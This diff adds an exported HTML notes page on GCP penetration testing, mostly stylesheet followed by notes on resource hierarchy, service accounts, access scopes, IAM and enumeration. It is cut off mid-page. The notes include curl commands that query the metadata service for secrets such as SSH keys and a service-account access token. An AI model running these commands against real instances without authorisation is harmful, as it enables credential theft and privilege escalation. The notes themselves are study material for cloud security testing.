@@ -1,0 +1,745 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>GCP Penetration Testing I</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="36bfb7be-f919-44b0-a825-909516c046db" class="page mono"><header><h1 class="page-title"><strong>GCP Penetration Testing I</strong></h1><p class="page-description"></p></header><div class="page-body"><h1 id="c09528a1-b125-4deb-b7fd-3507288e8d9f" class=""><strong>GCP Fundamentals</strong></h1><ul id="3286b8e0-473f-4364-b112-9f61cc076d39" class="bulleted-list"><li style="list-style-type:disc">raw HTTP API call for a given <code>gcloud</code> command can be found by appending <code>-log-http</code> to the command</li></ul><p id="7487f81f-e1a6-4768-a5e8-2dbd4c33697f" class=""><strong>Recursively enumerate an instance’s metadata:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b847e04d-6b5f-4bb3-be53-2f3be45ab89c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl &quot;http://metadata.google.internal/computeMetadata/v1/?recursive=true&amp;alt=text&quot; -H &quot;Metadata-Flavor: Google&quot;
+</code></pre><ul id="fc6efe8d-4290-4a06-b56a-be09977e883d" class="bulleted-list"><li style="list-style-type:disc">you may find some juicy information in the metadata including private SSH keys</li></ul><ul id="c6a9b609-30d1-4358-a32d-a36d39c2aaec" class="bulleted-list"><li style="list-style-type:disc">GCP uses a resource hierarchy<ul id="305c30e2-8484-452e-9899-cc4c6032cde8" class="bulleted-list"><li style="list-style-type:circle">similar to traditional filesystem structure:</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="13872dde-c11e-4cc6-a415-36752f590dae" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Organization
+--&gt; Folders
+  --&gt; Projects
+    --&gt; Resources</code></pre><ul id="62fe9cbf-cf9e-4412-af01-6eb49daec68e" class="bulleted-list"><li style="list-style-type:circle">therefore, if a user has a certain permission to an organization, that permission gets propagated to folders, projects, and resources</li></ul></li></ul><h1 id="9ab0a20d-ce8f-46b0-9f79-c3c198d1c0cb" class=""><strong>Service Accounts</strong></h1><ul id="6c567980-25e3-4276-bd67-b8cf758e1302" class="bulleted-list"><li style="list-style-type:disc">every GCP project has a default service account<ul id="38892c12-be14-4066-8115-d6bbb142d614" class="bulleted-list"><li style="list-style-type:circle">this service account gets assigned to any resource created within that project as well</li></ul></li></ul><p id="e6e357c5-3978-47e6-bb1a-bd2a5944b93e" class="">Default service accounts look like the following:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d219c5dd-69a4-4556-a6d7-5384467610d3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">PROJECT_NUMBER-compute@developer.gserviceaccount.com
+PROJECT_ID@appspot.gserviceaccount.com</code></pre><p id="f49b9cd0-0f9f-4704-ace0-8416ed66533e" class="">Custom service accounts look like the following:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b36c2b8b-5501-4ef8-83c2-38bde3bfe1eb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SERVICE_ACCOUNT_NAME@PROJECT_NAME.iam.gserviceaccount.com</code></pre><h1 id="febdcb57-f7ef-4d99-96aa-95311b0bbb06" class=""><strong>Access Scopes</strong></h1><ul id="497b590a-f608-44e4-b258-cb433b0f9c86" class="bulleted-list"><li style="list-style-type:disc">the access scope of a service account can be seen by querying the <code>169.254.169.254</code> IP such as in the example below:</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6049206f-c56c-4075-be19-3ad8e207ce2a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$ curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes \
+    -H &#x27;Metadata-Flavor:Google&#x27;
+
+https://www.googleapis.com/auth/devstorage.read_only
+https://www.googleapis.com/auth/logging.write
+https://www.googleapis.com/auth/monitoring.write
+https://www.googleapis.com/auth/servicecontrol
+https://www.googleapis.com/auth/service.management.readonly
+https://www.googleapis.com/auth/trace.append</code></pre><ul id="86064066-faf2-49b6-ad37-8154eb44ef5b" class="bulleted-list"><li style="list-style-type:disc">the <code>devstorage.read_only</code> default scope allows read access to all storage buckets within the specified project</li></ul><ul id="52a1cd65-4daf-44d8-b251-3f18f88ea014" class="bulleted-list"><li style="list-style-type:disc">access scopes should not be relied on as a boundary for a service account’s permissions</li></ul><ul id="2a2f8790-8f08-4ffb-ae58-f3dc87a2155c" class="bulleted-list"><li style="list-style-type:disc">when <code>cloud-platform</code> is specified for an instance, the service account can attempt to authenticate to all API endpoints<ul id="26197dca-abd0-4234-92c8-eefe7964a267" class="bulleted-list"><li style="list-style-type:circle">this authentication will be successful if the permissions of the storage account allow it</li></ul></li></ul><ul id="857f3935-b3b3-4ba8-adff-977dbd9392a7" class="bulleted-list"><li style="list-style-type:disc">even though a service account may have permissions to access a certain API endpoint, if this endpoint is not allowed by the access scope, successful authentication cannot occur</li></ul><h1 id="185ee4c4-87cd-4f5f-b3e6-4daf65ac9d5b" class=""><strong>IAM</strong></h1><p id="633ff018-1054-4c85-8d45-72af568b9bc1" class="">Primitive roles</p><ul id="f6d9560d-3b62-40ca-afe3-14419263ce02" class="bulleted-list"><li style="list-style-type:disc"><code>Owner</code>, <code>Editor</code>, and <code>Viewer</code></li></ul><ul id="1fa94b7d-273d-4fb6-91a0-ef73ff4c0168" class="bulleted-list"><li style="list-style-type:disc">!!!! default service account in every project is given the <code>Editor</code> role (insecure!!)</li></ul><p id="0a3be2a8-bcea-443d-8645-b0ab72075dc9" class="">Predefined roles</p><ul id="786567fa-8700-4af4-9a21-c55e4460a563" class="bulleted-list"><li style="list-style-type:disc">roles managed by Google (e.g. <code>compute.instanceAdmin</code>)</li></ul><p id="0c349734-2254-40ef-9ad5-15a54403fb41" class="">Custom roles</p><ul id="57aaf960-5bef-4524-8778-83ca1382c6f3" class="bulleted-list"><li style="list-style-type:disc">provides admins the ability to create their own set of permissions for a role</li></ul><p id="f896d4b4-4776-4697-b5f5-3636660cd0bf" class="">To see roles assigned to each member of a project:</p><p id="a60e9573-1dac-4adf-ad3e-ed52584b42b4" class=""><code>gcloud projects get-iam-policy &lt;PROJECT_ID&gt;</code></p><h1 id="93a8c0f7-6d1e-420f-9c10-aa9dfab7923e" class=""><strong>Enumeration</strong></h1><table id="87f8c634-12ce-40b7-b63b-21e034b26aa0" class="simple-table"><tbody><tr id="e6181c4b-fcb9-44db-b327-44625b3f0e06"><td id="RJKZ" class=""><strong>Command</strong></td><td id="wEAG" class=""><strong>Description</strong></td></tr><tr id="a769a082-d538-4365-b3b7-d387f7bc8fa0"><td id="RJKZ" class=""><code>gcloud organizations list</code></td><td id="wEAG" class="">Get organization ID</td></tr><tr id="b373f23f-d141-4c15-972b-29dd6520d5bf"><td id="RJKZ" class=""><code>gcloud organizations get-iam-policy</code></td><td id="wEAG" class="">View user permissions within organization</td></tr></tbody></table><ul id="313bcdbb-1e7e-4bc9-8c2b-58d99045f961" class="bulleted-list"><li style="list-style-type:disc">note that the permissions within an organization are applied to all projects within the organization, which are therefore applied to all resources within that project, etc.</li></ul><h1 id="f267124c-a904-4005-aa75-cb8d1b9c9b2b" class=""><strong>Application Default Credentials</strong></h1><h1 id="a5365a7f-d54c-46ac-a2fc-a0db8b168a37" class=""><strong>Service Account Token</strong></h1><p id="f775a566-7d50-4a25-a11d-d991be0f0edf" class="">Token can be retrieved from metadata service:</p><p id="3dd2916a-5450-44af-a959-5e4d6b9f1c66" class=""><strong>Request</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0febd482-a772-487d-b4f9-ebf2d49ad5fa" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&quot; -H &quot;Metadata-Flavor: Google&quot;</code></pre><p id="80aec228-b706-457b-8655-df962947d68f" class=""><strong>Response</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="477cd7ce-433f-4871-971a-abd2bc5cc19c" class="code"><code class="language-Plain Text" 